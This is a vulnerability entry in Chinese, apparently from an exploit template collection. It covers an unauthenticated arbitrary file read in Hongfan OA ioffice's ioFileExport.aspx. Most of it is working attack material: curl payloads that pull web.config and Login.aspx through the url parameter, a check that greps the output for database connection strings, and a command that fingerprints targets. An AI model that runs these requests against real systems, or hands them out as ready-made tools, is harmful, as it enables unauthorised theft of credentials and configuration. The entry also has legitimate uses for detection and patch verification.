---
id: HONGFAN-FILE-READ
title: 红帆OA ioffice ioFileExport.aspx 任意文件读取漏洞
product: hongfan-oa
vendor: 红帆科技
version_affected: "all versions"
severity: HIGH
tags: [file_read, 无需认证, 国产, oa]
fingerprint: ["红帆", "ioffice"]
---

## 漏洞描述

红帆OA（ioffice）的 ioFileExport.aspx 文件存在任意文件读取漏洞，url 参数直接接受任意路径作为输入，攻击者无需认证即可读取 web.config 等敏感配置文件，获取数据库连接字符串及其他敏感信息。

## 影响版本

- 红帆OA ioffice（所有已知版本）

## 前置条件

- 无需认证
- 目标运行红帆OA ioffice

## 利用步骤

1. 确认目标为红帆OA
2. 通过 ioFileExport.aspx 的 url 参数指定文件路径
3. 读取 web.config 和其他敏感文件

## Payload

```bash
# 读取 web.config
curl -s "http://target/ioffice/prg/set/iocom/ioFileExport.aspx?url=/ioffice/web.config&filename=test.txt&ContentType=application/octet-stream"

# 读取登录页面源码
curl -s "http://target/ioffice/prg/set/iocom/ioFileExport.aspx?url=/ioffice/Login.aspx&filename=test.txt&ContentType=application/octet-stream"
```

## 验证方法

```bash
curl -s "http://target/ioffice/prg/set/iocom/ioFileExport.aspx?url=/ioffice/web.config&filename=test.txt&ContentType=application/octet-stream" | grep -i "connectionString\|appSettings"
```

## 指纹确认

```bash
curl -s "http://target/ioffice/" | grep -i "红帆\|ioffice"
```
